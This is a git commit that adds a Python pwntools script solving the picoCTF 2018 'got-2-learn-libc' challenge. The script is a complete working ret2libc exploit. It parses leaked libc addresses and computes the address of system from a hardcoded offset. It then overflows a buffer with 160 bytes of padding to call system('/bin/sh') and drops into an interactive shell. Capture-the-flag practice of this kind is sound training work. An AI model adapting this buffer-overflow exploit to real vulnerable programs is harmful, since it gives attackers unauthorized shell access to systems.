cea1914ac2820c42af003dad24fa0abde1a9e326
ItsOKayCZ <ItsOKayCZ@gmail.com>
2019-02-10 18:08:10 +0100

    Solving new challenges

---
+++ picoCTF/2018/got-2-learn-libc (DONE)/script.py
@@ -0,0 +1,37 @@
+#!/usr/bin/python
+from pwn import *
+import struct
+
+p = process("./vuln")
+data = p.recv()
+print data
+
+# Getting the leaked functions
+tmp = data.split("\n")
+puts = tmp[2].split(" ")[1]
+binSHString = tmp[6].split(" ")[1]
+
+# print "Enter the offset to system from puts ({}): ".format(puts)
+# offset = raw_input()
+offset = "-0x2a940"
+
+# Got address of system
+systemAddress = struct.pack("I", int(puts, 16) - int(offset, 16))
+print "Offset: {}".format(offset)
+print "puts: {}".format(puts)
+print "systemAddress: {}".format(repr(systemAddress))
+
+# Padding
+padding = "A"*160
+
+# /bin/sh/ string
+binSH = struct.pack("I", int(binSHString, 16))
+
+payload = padding + systemAddress + "AAAA" + binSH
+p.sendline(payload)
+print "[#] Sending payload: {}".format(payload)
+
+print p.recv()
+
+
+p.interactive()
